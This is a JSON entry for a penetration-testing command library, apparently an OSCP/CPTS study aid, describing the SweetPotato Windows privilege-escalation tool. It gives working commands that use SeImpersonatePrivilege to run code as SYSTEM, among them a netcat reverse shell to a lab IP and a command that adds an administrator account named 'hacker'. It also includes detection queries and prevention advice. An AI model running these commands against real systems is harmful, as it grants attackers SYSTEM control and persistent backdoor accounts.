@@ -1,0 +1,97 @@
+{
+  "id": "privesc-sweetpotato",
+  "name": "SweetPotato - Multi-Technique Potato Privilege Escalation",
+  "command": "SweetPotato.exe -e EfsRpc -p C:\\temp\\nc.exe -a \"-e cmd.exe <ip> <port>\"",
+  "description": "SweetPotato combines multiple potato techniques into one tool: EfsPotato (EfsRpc), PrintSpoofer, and JuicyPotato techniques. Automatically selects the best technique for the target OS. Escalates from SeImpersonatePrivilege to SYSTEM on Windows Server 2008-2022.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Post-Exploitation",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "CCob/SweetPotato",
+  "tags": [
+    "sweetpotato",
+    "potato",
+    "seimpersonate",
+    "privesc",
+    "efspotato",
+    "system"
+  ],
+  "mitre": [
+    "T1134.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== TECHNIQUES ===\n  -e EfsRpc     # EfsPotato - works on most modern Windows\n  -e PrintSpoofer  # Uses print spooler named pipe\n  -e JuicyPotato  # COM server abuse (older Windows)\n\n=== USAGE ===\n  # Execute command as SYSTEM:\n  SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c whoami > C:\\temp\\out.txt\"\n  # Reverse shell:\n  SweetPotato.exe -e EfsRpc -p C:\\temp\\nc.exe -a \"-e cmd.exe <ip> <port>\"\n  # Add admin:\n  SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c net user hacker Pass123! /add && net localgroup administrators hacker /add\"\n\n=== WHICH POTATO WHEN ===\n  GodPotato:    All modern Windows. Most reliable.\n  SweetPotato:  Multi-technique, auto-selects. Good backup.\n  PrintSpoofer: If print spooler is running.\n  JuicyPotato:  Older Windows (2008-2016). Needs CLSID.\n  RoguePotato:  If outbound TCP is available.",
+  "examples": [
+    {
+      "label": "Execute as SYSTEM via EfsRpc",
+      "command": "SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c whoami\""
+    },
+    {
+      "label": "Reverse shell as SYSTEM",
+      "command": "SweetPotato.exe -e EfsRpc -p C:\\temp\\nc.exe -a \"-e cmd.exe 10.10.14.5 4444\""
+    },
+    {
+      "label": "Try PrintSpoofer technique",
+      "command": "SweetPotato.exe -e PrintSpoofer -p cmd.exe -a \"/c whoami\""
+    }
+  ],
+  "references": [
+    {
+      "title": "SweetPotato",
+      "url": "https://github.com/CCob/SweetPotato"
+    },
+    {
+      "title": "MITRE T1134.001",
+      "url": "https://attack.mitre.org/techniques/T1134/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "privesc-godpotato",
+      "note": "GodPotato is newer and more reliable on modern Windows.",
+      "rel": "alternative"
+    },
+    {
+      "id": "seimpersonate-printspoofer",
+      "note": "Standalone PrintSpoofer technique.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Combines EfsPotato, PrintSpoofer, and JuicyPotato techniques to abuse SeImpersonatePrivilege via DCOM/named pipes/RPC coercion to impersonate SYSTEM tokens.",
+    "prerequisites": "Service account with SeImpersonatePrivilege; SweetPotato binary on target.",
+    "impact": "SYSTEM-level code execution from a service account.",
+    "detection": "[MITRE T1134.001] SweetPotato process creation; token impersonation; SYSTEM child process from service account.",
+    "artifacts": "SweetPotato.exe on disk; process tree showing service-to-SYSTEM escalation; named pipe creation.",
+    "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*SweetPotato*\" OR CommandLine=\"*SweetPotato*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+    "elastic_kql": "process.name:*SweetPotato* OR process.args:*SweetPotato*",
+    "sentinel_kql": "DeviceProcessEvents\n| where FileName has \"SweetPotato\" or ProcessCommandLine has \"SweetPotato\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+    "sigma_rules": "win_process_creation_sweetpotato_privesc",
+    "prevention": "Remove SeImpersonatePrivilege from service accounts; use gMSA; EDR signatures for potato tools.",
+    "sources": [
+      "CCob research",
+      "https://attack.mitre.org/techniques/T1134/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "SweetPotato privilege escalation",
+        "logic": "DeviceProcessEvents\n| where FileName has_any (\"SweetPotato\", \"GodPotato\", \"JuicyPotato\")\n  or ProcessCommandLine has_any (\"-e EfsRpc\", \"-e PrintSpoofer\", \"-e JuicyPotato\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1134.001"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Renamed binaries evade filename detection",
+        "tuning": "Also detect by behavior: service account spawning SYSTEM child processes"
+      }
+    ]
+  }
+}
